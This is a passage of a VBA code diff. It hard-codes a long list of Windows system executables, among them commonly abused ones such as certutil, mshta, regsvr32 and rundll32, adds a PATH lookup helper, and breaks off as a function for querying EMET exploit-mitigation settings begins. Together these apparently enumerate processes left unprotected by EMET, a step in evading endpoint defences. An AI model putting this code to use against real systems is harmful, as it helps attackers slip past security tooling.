+myList = myList & "C:\Windows\System32\unlodctr.exe" & ","
+myList = myList & "C:\Windows\System32\unregmp2.exe" & ","
+myList = myList & "C:\Windows\System32\upnpcont.exe" & ","
+myList = myList & "C:\Windows\System32\UserAccountControlSettings.exe" & ","
+myList = myList & "C:\Windows\System32\userinit.exe" & ","
+myList = myList & "C:\Windows\System32\Utilman.exe" & ","
+myList = myList & "C:\Windows\System32\VaultCmd.exe" & ","
+myList = myList & "C:\Windows\System32\VaultSysUi.exe" & ","
+myList = myList & "C:\Windows\System32\vds.exe" & ","
+myList = myList & "C:\Windows\System32\vdsldr.exe" & ","
+myList = myList & "C:\Windows\System32\verclsid.exe" & ","
+myList = myList & "C:\Windows\System32\verifier.exe" & ","
+myList = myList & "C:\Windows\System32\vssadmin.exe" & ","
+myList = myList & "C:\Windows\System32\VSSVC.exe" & ","
+myList = myList & "C:\Windows\System32\w32tm.exe" & ","
+myList = myList & "C:\Windows\System32\waitfor.exe" & ","
+myList = myList & "C:\Windows\System32\wbadmin.exe" & ","
+myList = myList & "C:\Windows\System32\wbengine.exe" & ","
+myList = myList & "C:\Windows\System32\wecutil.exe" & ","
+myList = myList & "C:\Windows\System32\WerFault.exe" & ","
+myList = myList & "C:\Windows\System32\WerFaultSecure.exe" & ","
+myList = myList & "C:\Windows\System32\wermgr.exe" & ","
+myList = myList & "C:\Windows\System32\wevtutil.exe" & ","
+myList = myList & "C:\Windows\System32\wextract.exe" & ","
+myList = myList & "C:\Windows\System32\WFS.exe" & ","
+myList = myList & "C:\Windows\System32\where.exe" & ","
+myList = myList & "C:\Windows\System32\whoami.exe" & ","
+myList = myList & "C:\Windows\System32\wiaacmgr.exe" & ","
+myList = myList & "C:\Windows\System32\wiawow64.exe" & ","
+myList = myList & "C:\Windows\System32\wimserv.exe" & ","
+myList = myList & "C:\Windows\System32\WindowsAnytimeUpgrade.exe" & ","
+myList = myList & "C:\Windows\System32\WindowsAnytimeUpgradeResults.exe" & ","
+myList = myList & "C:\Windows\System32\WindowsAnytimeUpgradeui.exe" & ","
+myList = myList & "C:\Windows\System32\wininit.exe" & ","
+myList = myList & "C:\Windows\System32\winload.exe" & ","
+myList = myList & "C:\Windows\System32\winlogon.exe" & ","
+myList = myList & "C:\Windows\System32\winresume.exe" & ","
+myList = myList & "C:\Windows\System32\winrs.exe" & ","
+myList = myList & "C:\Windows\System32\winrshost.exe" & ","
+myList = myList & "C:\Windows\System32\WinSAT.exe" & ","
+myList = myList & "C:\Windows\System32\winver.exe" & ","
+myList = myList & "C:\Windows\System32\wisptis.exe" & ","
+myList = myList & "C:\Windows\System32\wksprt.exe" & ","
+myList = myList & "C:\Windows\System32\wlanext.exe" & ","
+myList = myList & "C:\Windows\System32\wlrmdr.exe" & ","
+myList = myList & "C:\Windows\System32\wowreg32.exe" & ","
+myList = myList & "C:\Windows\System32\WPDShextAutoplay.exe" & ","
+myList = myList & "C:\Windows\System32\wpnpinst.exe" & ","
+myList = myList & "C:\Windows\System32\write.exe" & ","
+myList = myList & "C:\Windows\System32\wscript.exe" & ","
+myList = myList & "C:\Windows\System32\WSManHTTPConfig.exe" & ","
+myList = myList & "C:\Windows\System32\wsmprovhost.exe" & ","
+myList = myList & "C:\Windows\System32\wsqmcons.exe" & ","
+myList = myList & "C:\Windows\System32\wuapp.exe" & ","
+myList = myList & "C:\Windows\System32\wuauclt.exe" & ","
+myList = myList & "C:\Windows\System32\WUDFHost.exe" & ","
+myList = myList & "C:\Windows\System32\wusa.exe" & ","
+myList = myList & "C:\Windows\System32\xcopy.exe" & ","
+myList = myList & "C:\Windows\System32\xpsrchvw.exe" & ","
+myList = myList & "C:\Windows\System32\xwizard.exe" & ","
+myList = myList & "C:\Windows\System32\Boot\winload.exe" & ","
+myList = myList & "C:\Windows\System32\Boot\winresume.exe" & ","
+myList = myList & "C:\Windows\System32\com\comrepl.exe" & ","
+myList = myList & "C:\Windows\System32\com\MigRegDB.exe" & ","
+myList = myList & "C:\Windows\System32\Dism\DismHost.exe" & ","
+myList = myList & "C:\Windows\System32\IME\IMEJP10\IMJPDADM.EXE" & ","
+myList = myList & "C:\Windows\System32\IME\IMEJP10\IMJPDCT.EXE" & ","
+myList = myList & "C:\Windows\System32\IME\IMEJP10\IMJPDSVR.EXE" & ","
+myList = myList & "C:\Windows\System32\IME\IMEJP10\IMJPMGR.EXE" & ","
+myList = myList & "C:\Windows\System32\IME\IMEJP10\imjppdmg.exe" & ","
+myList = myList & "C:\Windows\System32\IME\IMEJP10\IMJPUEX.EXE" & ","
+myList = myList & "C:\Windows\System32\IME\IMEJP10\imjpuexc.exe" & ","
+myList = myList & "C:\Windows\System32\IME\IMESC5\IMSCPROP.exe" & ","
+myList = myList & "C:\Windows\System32\IME\IMETC10\IMTCPROP.exe" & ","
+myList = myList & "C:\Windows\System32\IME\shared\IMCCPHR.exe" & ","
+myList = myList & "C:\Windows\System32\IME\shared\IMEPADSV.EXE" & ","
+myList = myList & "C:\Windows\System32\migwiz\mighost.exe" & ","
+myList = myList & "C:\Windows\System32\migwiz\MigSetup.exe" & ","
+myList = myList & "C:\Windows\System32\migwiz\migwiz.exe" & ","
+myList = myList & "C:\Windows\System32\migwiz\PostMig.exe" & ","
+myList = myList & "C:\Windows\System32\oobe\audit.exe" & ","
+myList = myList & "C:\Windows\System32\oobe\msoobe.exe" & ","
+myList = myList & "C:\Windows\System32\oobe\oobeldr.exe" & ","
+myList = myList & "C:\Windows\System32\oobe\Setup.exe" & ","
+myList = myList & "C:\Windows\System32\oobe\setupsqm.exe" & ","
+myList = myList & "C:\Windows\System32\oobe\windeploy.exe" & ","
+myList = myList & "C:\Windows\System32\Speech\SpeechUX\SpeechUXTutorial.exe" & ","
+myList = myList & "C:\Windows\System32\Speech\SpeechUX\SpeechUXWiz.exe" & ","
+myList = myList & "C:\Windows\System32\sysprep\sysprep.exe" & ","
+myList = myList & "C:\Windows\System32\wbem\mofcomp.exe" & ","
+myList = myList & "C:\Windows\System32\wbem\scrcons.exe" & ","
+myList = myList & "C:\Windows\System32\wbem\unsecapp.exe" & ","
+myList = myList & "C:\Windows\System32\wbem\wbemtest.exe" & ","
+myList = myList & "C:\Windows\System32\wbem\WinMgmt.exe" & ","
+myList = myList & "C:\Windows\System32\wbem\WMIADAP.exe" & ","
+myList = myList & "C:\Windows\System32\wbem\WmiApSrv.exe" & ","
+myList = myList & "C:\Windows\System32\wbem\WMIC.exe" & ","
+myList = myList & "C:\Windows\System32\wbem\WmiPrvSE.exe" & ","
+myList = myList & "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & ","
+myList = myList & "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\AdapterTroubleshooter.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ARP.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\at.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\AtBroker.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\attrib.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\auditpol.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\autochk.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\autoconv.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\autofmt.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\bitsadmin.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\bootcfg.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\bthudtask.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cacls.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\calc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\CertEnrollCtrl.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\certreq.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\certutil.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\charmap.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\chkdsk.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\chkntfs.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\choice.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cipher.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cleanmgr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cliconfg.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\clip.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cmd.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cmdkey.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cmdl32.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cmmon32.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cmstp.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\colorcpl.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\comp.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\compact.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ComputerDefaults.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\control.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\convert.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\credwiz.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cscript.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ctfmon.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cttune.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\cttunesvr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dccw.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dcomcnfg.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ddodiag.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\DevicePairingWizard.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\DeviceProperties.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dfrgui.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dialer.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\diantz.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\diskpart.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\diskperf.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\diskraid.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\Dism.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\DisplaySwitch.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dllhost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dllhst3g.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dnscacheugc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\doskey.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dpapimig.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\DpiScaling.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dplaysvr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dpnsvr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\driverquery.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\drvinst.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dvdplay.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\dvdupgrd.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\DWWIN.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\dxdiag.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\efsui.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\EhStorAuthn.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\esentutl.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\eudcedit.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\eventcreate.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\eventvwr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\expand.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\explorer.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\extrac32.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\fc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\find.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\findstr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\finger.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\fixmapi.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\fltMC.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\fontview.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\forfiles.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\fsutil.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ftp.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\getmac.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\gpresult.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\gpupdate.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\grpconv.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\hdwwiz.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\help.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\hh.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\HOSTNAME.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\icacls.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\icardagt.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\icsunattend.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ie4uinit.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ieUnatt.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\iexpress.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\InfDefaultInstall.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\instnm.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ipconfig.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\iscsicli.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\iscsicpl.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\isoburn.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ktmutil.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\label.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\LocationNotifications.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\lodctr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\logagent.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\logman.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\Magnify.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\makecab.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\mcbuilder.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\mfpmp.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\MigAutoPlay.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\mmc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\mobsync.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\mountvol.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\MRINFO.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\msdt.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\msfeedssync.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\mshta.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\msiexec.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\msinfo32.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\mspaint.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\msra.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\mstsc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\mtstocom.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\MuiUnattend.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\NAPSTAT.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\ndadmin.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\net.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\net1.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\netbtugc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\netiougc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\Netplwiz.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\netsh.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\NETSTAT.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\newdev.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\notepad.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\nslookup.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ntkrnlpa.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ntoskrnl.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ntprint.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ocsetup.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\odbcad32.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\odbcconf.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\openfiles.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\OptionalFeatures.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\osk.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\PATHPING.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\pcaui.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\perfhost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\perfmon.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\PING.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\PkgMgr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\poqexec.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\powercfg.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\PresentationHost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\prevhost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\print.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\printui.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\proquota.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\psr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\rasautou.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\rasdial.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\raserver.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\rasphone.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\rdrleakdiag.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ReAgentc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\recover.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\reg.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\regedit.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\regedt32.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\regini.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\RegisterIEPKEYs.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\regsvr32.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\rekeywiz.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\relog.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\replace.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\resmon.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\RMActivate.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\RMActivate_isv.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\RMActivate_ssp.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\RMActivate_ssp_isv.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\RmClient.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\Robocopy.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\ROUTE.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\RpcPing.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\rrinstaller.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\runas.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\rundll32.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\RunLegacyCPLElevated.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\runonce.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\sbunattend.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\sc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\schtasks.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\sdbinst.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\sdchange.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\sdiagnhost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SearchFilterHost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SearchIndexer.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SearchProtocolHost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SecEdit.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\secinit.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\sethc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SetIEInstalledDate.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\setup16.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\setupSNK.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\setupugc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\setx.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\sfc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\shrpubw.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\shutdown.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SndVol.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\sort.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\srdelayed.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\subst.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\svchost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\sxstrace.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SyncHost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\syskey.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\systeminfo.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SystemPropertiesComputerName.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SystemPropertiesDataExecutionPrevention.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SystemPropertiesHardware.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SystemPropertiesPerformance.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SystemPropertiesProtection.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\SystemPropertiesRemote.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\systray.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\takeown.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\TapiUnattend.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\taskeng.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\taskkill.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\tasklist.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\taskmgr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\tcmsetup.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\TCPSVCS.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\timeout.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\TpmInit.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\tracerpt.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\TRACERT.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\TSTheme.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\TsWpfWrp.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\typeperf.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\tzutil.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\unlodctr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\unregmp2.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\upnpcont.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\user.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\UserAccountControlSettings.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\userinit.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\Utilman.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\verclsid.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\verifier.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\vssadmin.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\w32tm.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\waitfor.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wecutil.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\WerFault.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\WerFaultSecure.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wermgr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wevtutil.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wextract.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\where.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\whoami.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wiaacmgr.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wimserv.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wininit.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\winrs.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\winrshost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\winver.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wlanext.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wowreg32.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\WPDShextAutoplay.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\write.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wscript.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\WSManHTTPConfig.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wsmprovhost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wuapp.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wusa.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\xcopy.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\xpsrchvw.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\xwizard.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\com\comrepl.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\com\MigRegDB.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\Dism\DismHost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\IMEJP10\IMJPDADM.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\IMEJP10\IMJPDCT.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\IMEJP10\IMJPDSVR.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\IMEJP10\IMJPMGR.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\IMEJP10\imjppdmg.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\IMEJP10\IMJPUEX.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\IMEJP10\imjpuexc.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\IMESC5\IMSCPROP.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\IMETC10\IMTCPROP.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\shared\IMCCPHR.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\IME\shared\IMEPADSV.EXE" & ","
+myList = myList & "C:\Windows\SysWOW64\InstallShield\setup.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\InstallShield\_isdel.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\migwiz\mighost.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\migwiz\MigSetup.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\migwiz\migwiz.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\migwiz\PostMig.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wbem\mofcomp.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wbem\WinMgmt.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wbem\WMIADAP.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wbem\WMIC.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\wbem\WmiPrvSE.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe" & ","
+myArray = Split(myList, ",")
+Dim c As Integer
+Dim list() As String
+For c = LBound(myArray) To (UBound(myArray) - 1)
+ReDim Preserve list(c)
+list(c) = myArray(c)
+Next
+c = UBound(list)
+Dim colFiles As New Collection
+Dim vFile As Variant
+For Each vFile In colFiles
+ReDim Preserve list(c)
+list(c) = vFile
+c = c + 1
+Next vFile
+getList = list
+End Function
+Public Function pathOf(program As String) As String
+pathOf = ""
+If program Like "*.exe" Then
+program = program
+Else
+program = program & ".exe"
+End If
+If program Like "*:\*" Then
+pathOf = program
+Exit Function
+Else
+paths = Environ("PATH")
+Dim allPaths() As String
+allPaths = Split(paths, ";")
+For Each Path In allPaths
+ms = Path & "\" & program
+If Not Dir(ms, vbDirectory) = vbNullString Then
+pathOf = ms
+Exit Function
+End If
+Next
+End If
+End Function
+Public Function getEMET() As String()
+Set objShell = CreateObject("WScript.Shell")
